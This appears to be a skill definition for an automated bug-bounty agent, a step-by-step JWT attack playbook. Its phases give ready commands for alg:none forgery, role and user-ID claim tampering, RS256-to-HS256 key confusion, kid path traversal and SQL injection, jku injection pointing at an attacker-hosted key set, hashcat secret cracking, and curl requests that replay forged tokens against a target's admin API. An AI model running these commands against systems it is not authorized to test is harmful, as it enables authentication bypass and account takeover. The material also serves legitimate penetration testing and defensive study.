---
name: attack-jwt
description: "JWT token attacks — alg:none bypass, key confusion, claim tampering, signature stripping"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - jwt
  - authentication
  - web
  - token
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-287
  - CWE-347
  - CWE-345
chains_with:
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-idor-automation: "JWT tampering + IDOR = full account takeover"
---

# JWT Token Attack

## Objective

Exploit JWT implementation weaknesses to bypass authentication, escalate privileges, or forge tokens.

## Testing Methodology

### Phase 1: Decode & Analyze

```bash
# Automated JWT analysis and tamper token generation
attack_script jwt_tamper EYTOKEN --json-output

# Manual decode
echo "HEADER.PAYLOAD.SIG" | cut -d. -f1 | base64 -d 2>/dev/null
echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null
```

Check for:
- Algorithm (`alg` field): RS256, HS256, none
- Claims: `role`, `is_admin`, `sub`, `exp`, `aud`, `iss`
- Key ID (`kid`): SQL injection, path traversal potential

### Phase 2: Algorithm Attacks

```bash
# Generate alg=none token
attack_script jwt_tamper EYTOKEN --set-header alg=none

# Role escalation
attack_script jwt_tamper EYTOKEN --set role=admin --set-header alg=none

# User ID swap
attack_script jwt_tamper EYTOKEN --set sub=1 --set-header alg=none

# HS256 with known/weak key
attack_script jwt_tamper EYTOKEN --set role=admin --key "secret"
```

### Phase 3: Key Confusion (RS256 → HS256)

If server uses RS256, try signing with the public key as HS256 secret:

```bash
# Fetch public key
curl -s https://TARGET/.well-known/jwks.json

# Convert JWK to PEM and sign
attack_script jwt_tamper EYTOKEN --set role=admin --key "$(cat public.pem)" --set-header alg=HS256
```

### Phase 4: kid Injection

```bash
# SQL injection via kid
attack_script jwt_tamper EYTOKEN --set-header "kid=../../../../../../dev/null" --key ""

# kid pointing to accessible file
attack_script jwt_tamper EYTOKEN --set-header "kid=/proc/sys/kernel/hostname"
```

### Phase 5: Verify Impact

```bash
# Test tampered token
curl -s -H "Authorization: Bearer TAMPERED_TOKEN" https://TARGET/api/admin/users
```

## What Constitutes a Finding

| Attack | Severity |
|--------|----------|
| alg=none accepted — auth bypass | Critical (P1) |
| Role escalation via claim tampering | Critical (P1) |
| RS256→HS256 key confusion | Critical (P1) |
| Weak signing key (crackable) | High (P2) |
| kid SQL injection | Critical (P1) |
| Expired tokens accepted | Medium (P3) |

## Evidence Requirements

- Original JWT decoded (header + payload)
- Tampered JWT with modified claims
- Server response accepting tampered token
- Proof of elevated access (admin data, other user data)

## Tools

- `attack_script jwt_tamper` — automated decode/tamper/re-encode
- `jwt_tool` (external) — comprehensive JWT testing
- `hashcat -m 16500` — JWT secret cracking

## HowToHunt Advanced Supplement

> **Source:** [KathanP19/HowToHunt — JWT](https://github.com/KathanP19/HowToHunt/tree/master/JWT) (528 lines, OLD_JWT_ATTACK_Notes). Licensed GPL-3.0.

**Additional JWT attacks from HowToHunt:**

```bash
# kid path traversal / SQLi
# Header: {"kid": "../../etc/passwd"} or {"kid": "1' UNION SELECT 'key'"}
curl -H "Authorization: Bearer header.payload.signature" https://target.com/api
# Test kid with: ../../dev/null, /etc/passwd, 1' OR '1'='1

# jku/x5u header injection (fetch attacker JWK)
# Header: {"jku": "https://attacker.com/jwks.json"}
# Host attacker JWKS with your public key, sign token with private key

# Weak secret brute force (HS256 with weak key)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Then forge: echo -n "header.payload" | openssl dgst -sha256 -hmac "cracked_secret" -binary | base64

# alg confusion: RS256 (public key) -> HS256 (use public key as HMAC secret)
# Decode RS256 token, change alg to HS256, sign with server's public key
```

Test for `none` alg, key confusion, and `kid` traversal together — HowToHunt reports `kid` SQLi as critical P1 when combined with JWT.

## References

- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
